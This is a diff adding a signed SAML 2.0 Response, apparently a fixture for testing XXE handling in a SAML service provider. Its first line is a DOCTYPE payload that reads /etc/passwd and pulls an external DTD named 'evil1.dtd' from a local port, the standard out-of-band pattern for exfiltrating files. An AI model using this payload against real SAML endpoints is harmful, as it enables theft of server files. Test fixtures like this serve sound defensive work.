@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roottag [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://127.0.0.1:2323/evil1.dtd">%dtd;]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" Destination="https://samlcent/Shibboleth.sso/SAML2/POST" ID="_fd601e21-5f81-469e-88c7-da72dccf1357" InResponseTo="_545e60fe3602a06d25f241b622c5a773" IssueInstant="2015-04-06T06:42:39.213Z" Version="2.0">
+  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://SAMLWIN.saml.lan/adfs/services/trust</Issuer>
+  <samlp:Status>
+    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+  </samlp:Status>
+  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_f27d6403-32f3-45ec-8b24-8b2fb4ca99b0" IssueInstant="2015-04-06T06:42:39.212Z" Version="2.0">
+    <Issuer>http://SAMLWIN.saml.lan/adfs/services/trust</Issuer>
+    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+      <ds:SignedInfo>
+        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
+        <ds:Reference URI="#_f27d6403-32f3-45ec-8b24-8b2fb4ca99b0">
+          <ds:Transforms>
+            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
+            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+          </ds:Transforms>
+          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
+          <ds:DigestValue>foKK0crQsYCouYU2pt9dvyDdI9Z4s5Z0WAHrpclAfA8=</ds:DigestValue>
+        </ds:Reference>
+      </ds:SignedInfo>
+      <ds:SignatureValue>5a/BEGAyZFArapDrhKpycB7wADxpN1rwBOy5ADyMslFDZ2Xbrk6ILBVdwQh78Xd5OQtAXgap+Zsx8dIVF5TN4O7s8TDT3UkGERQu4eTisjhJaNjnc+HNXtkubKnQ2jpoGdoDfpgf2UJIVq7b9zXQxIki4V4DcMOJclhbiIwI2GXFlzm70fWYDAkuAkbaAOwX716jb6xkmMhA4kEDyszOxFlUbLdKp92H74D0wlhnIqP2k6ONzuTMLfjMGN5FZenqZyJUg6IX79mffFpCG6tFM9wRzaehThGRLIQ2QtYh4McBYwAq1JrL2QXurSpH06lrAzk0D79HKDBPR62Zws55Jw==</ds:SignatureValue>
+      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
+        <ds:X509Data>
+          <ds:X509Certificate>MIIC3DCCAcSgAwIBAgIQN0u7JfaKFrxPoGuP0EeVjTANBgkqhkiG9w0BAQsFADAqMSgwJgYDVQQDEx9BREZTIFNpZ25pbmcgLSBTQU1MV0lOLnNhbWwubGFuMB4XDTE1MDIyNTE3MTE0N1oXDTE2MDIyNTE3MTE0N1owKjEoMCYGA1UEAxMfQURGUyBTaWduaW5nIC0gU0FNTFdJTi5zYW1sLmxhbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPLTYkbBIvPa2+KrOvxoi1alOcOnxzFRlZELYhyiCj2j0hKuQd+fB+OgP4fNuaH/dEbSiZ0fD3MtQ0nrc65NTYrXpPqAasMEGpVVOemi4kaKwxrYOD3NbFoFxQjvjMV9UQt2RaBe160sFe58o5cWvNVxXA2Sf81fIeHlSBEMavFOQFQkQbDU/XmGtW0XjQhyyiJ4MEy7Zwgu2HmxpiwNa6wSflDXZIUYq3gUZ+eFr8kTgBrpgLtD2lAaaF8e9X0n6xiswDoORs70cNiyHgTN4ywL+1jT+vNjHoV+V9btTcfr0l/JytFrCNXx3z6k8pDmQVGIfbY7J4nRdqpzEd5MOTECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAqOCJMqE7pRBs5qvtmJ55r7f/HF6B+SRijzX4k0Bg7GGKQsNn2X3BC5MYCcVYlmzXw8k5JxxxMckExGlnSvph+2DyZJOysspMj2NKuseDSGaBGbhJXH/vF0Fm9Ps/Tf4BKIBrPE14ghCp4vtaXlpd13/w1eXSwqQ2rIREbmidGho6P9hkVH6G8ri2iClS78Edakhoskcc35UvXt4o6R77RTA9/jQ9NylxYoj0eYAlkIlG+rSDQpx8RXRiLQxsOl5EpXqmoD9zGAEWWAxcmzTAjJFFzis1F7n6nVuv8SVaKjQBEz/nmstduxLOo20DR/M0VAQQzwMDM9uihXNQwNWEMw==</ds:X509Certificate>
+        </ds:X509Data>
+      </KeyInfo>
+    </ds:Signature>
+    <Subject>
+      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <SubjectConfirmationData InResponseTo="_545e60fe3602a06d25f241b622c5a773" NotOnOrAfter="2015-04-06T06:47:39.213Z" Recipient="https://samlcent/Shibboleth.sso/SAML2/POST"/>
+      </SubjectConfirmation>
+    </Subject>
+    <Conditions NotBefore="2015-04-06T06:42:39.210Z" NotOnOrAfter="2015-04-06T07:42:39.210Z">
+      <AudienceRestriction>
+        <Audience>https://samlcent/shibboleth</Audience>
+      </AudienceRestriction>
+    </Conditions>
+    <AttributeStatement>
+      <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
+        <AttributeValue>bowser@saml.lan</AttributeValue>
+      </Attribute>
+      <Attribute Name="http://schemas.xmlsoap.org/claims/Group">
+        <AttributeValue>DomÃ¤nen-Benutzer</AttributeValue>
+      </Attribute>
+      <Attribute Name="urn:oid:1.3.6.1.4.1.5923.1.1.1.6" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <AttributeValue>bowser@saml.lan</AttributeValue>
+      </Attribute>
+    </AttributeStatement>
+    <AuthnStatement AuthnInstant="2015-04-06T06:42:39.178Z">
+      <AuthnContext>
+        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef>
+      </AuthnContext>
+    </AuthnStatement>
+  </Assertion>
+</samlp:Response>
